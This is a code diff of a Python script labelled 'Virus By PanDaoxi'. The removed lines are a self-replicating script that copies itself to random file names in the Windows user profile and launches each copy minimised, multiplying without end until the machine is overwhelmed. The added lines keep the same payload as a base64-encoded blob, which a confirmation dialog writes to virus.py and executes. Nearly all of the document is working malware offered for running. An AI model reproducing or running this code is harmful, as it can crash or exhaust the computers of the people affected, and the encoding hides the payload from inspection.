@@ -1,40 +1,18 @@
-# Author:PanDaoxi
-from os import system, environ
-from random import randint, shuffle
+# Author: PanDaoxi
+from easygui import buttonbox, msgbox
+from base64 import b64decode
+from os import system
 from sys import exit
 
-names_char, p1, p2 = [], "", ""
-for i in range(97, 123):
-    names_char.append(chr(i))
-for i in range(65, 91):
-    names_char.append(chr(i))
-for i in range(48, 58):
-    names_char.append(chr(i))
-
-def makeNames():
-    name, temp = "", names_char
-    shuffle(temp)
-    name = "".join(temp)
-    
-    start = randint(0, len(name) - 1)
-    end = randint(start, len(name) - 1) + 1
-    
-    return name[start : end]
-
 try:
-    with open(__file__, "rb") as source:
-        pandaoxi = source.read()
-        tPath = environ["UserProFile"]
-        p1, p2 = tPath + "\\%s.py" % makeNames(), tPath + "\\%s.py" % makeNames()
-        
-        with open(p1, "wb") as w1:
-            w1.write(pandaoxi)
-        with open(p2, "wb") as w2:
-            w2.write(pandaoxi)
-            
-    system("start /min python \"%s\"" % p1)
-    system("start /min python \"%s\"" % p2)
+    text = b"IyBBdXRob3I6IFBhbkRhb3hpCmZyb20gb3MgaW1wb3J0IHN5c3RlbSwgZW52aXJvbgpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludCwgc2h1ZmZsZQpmcm9tIHN5cyBpbXBvcnQgZXhpdAoKbmFtZXNfY2hhciwgcDEsIHAyID0gW10sICIiLCAiIgpmb3IgaSBpbiByYW5nZSg5NywgMTIzKToKICAgIG5hbWVzX2NoYXIuYXBwZW5kKGNocihpKSkKZm9yIGkgaW4gcmFuZ2UoNjUsIDkxKToKICAgIG5hbWVzX2NoYXIuYXBwZW5kKGNocihpKSkKZm9yIGkgaW4gcmFuZ2UoNDgsIDU4KToKICAgIG5hbWVzX2NoYXIuYXBwZW5kKGNocihpKSkKCmRlZiBtYWtlTmFtZXMoKToKICAgIG5hbWUsIHRlbXAgPSAiIiwgbmFtZXNfY2hhcgogICAgc2h1ZmZsZSh0ZW1wKQogICAgbmFtZSA9ICIiLmpvaW4odGVtcCkKICAgIAogICAgc3RhcnQgPSByYW5kaW50KDAsIGxlbihuYW1lKSAtIDEpCiAgICBlbmQgPSByYW5kaW50KHN0YXJ0LCBsZW4obmFtZSkgLSAxKSArIDEKICAgIAogICAgcmV0dXJuIG5hbWVbc3RhcnQgOiBlbmRdCgp0cnk6CiAgICB3aXRoIG9wZW4oX19maWxlX18sICJyYiIpIGFzIHNvdXJjZToKICAgICAgICBwYW5kYW94aSA9IHNvdXJjZS5yZWFkKCkKICAgICAgICB0UGF0aCA9IGVudmlyb25bIlVzZXJQcm9GaWxlIl0KICAgICAgICBwMSwgcDIgPSB0UGF0aCArICJcJXMucHkiICUgbWFrZU5hbWVzKCksIHRQYXRoICsgIlwlcy5weSIgJSBtYWtlTmFtZXMoKQogICAgICAgIAogICAgICAgIHdpdGggb3BlbihwMSwgIndiIikgYXMgdzE6CiAgICAgICAgICAgIHcxLndyaXRlKHBhbmRhb3hpKQogICAgICAgIHdpdGggb3BlbihwMiwgIndiIikgYXMgdzI6CiAgICAgICAgICAgIHcyLndyaXRlKHBhbmRhb3hpKQogICAgICAgICAgICAKICAgIHN5c3RlbSgic3RhcnQgL21pbiBweXRob24gXCIlc1wiIiAlIHAxKQogICAgc3lzdGVtKCJzdGFydCAvbWluIHB5dGhvbiBcIiVzXCIiICUgcDIpCiAgICAKICAgIGV4aXQoKQpleGNlcHQ6CiAgICBleGl0KCkgCg=="
+    cho = buttonbox("Are you sure you want to run this program?\nThis may cause your computer to crash.", "Virus By PanDaoxi", ("Yes", "No",))
     
-    exit()
-except:
+    if cho == "Yes":
+        with open("virus.py", "wb") as f:
+            f.write(b64decode(text))
+        system("python \"virus.py\"")
+
+except Exception as e:
+    msgbox("Error at:\n\n%s" % e, "Virus Error")
     exit()
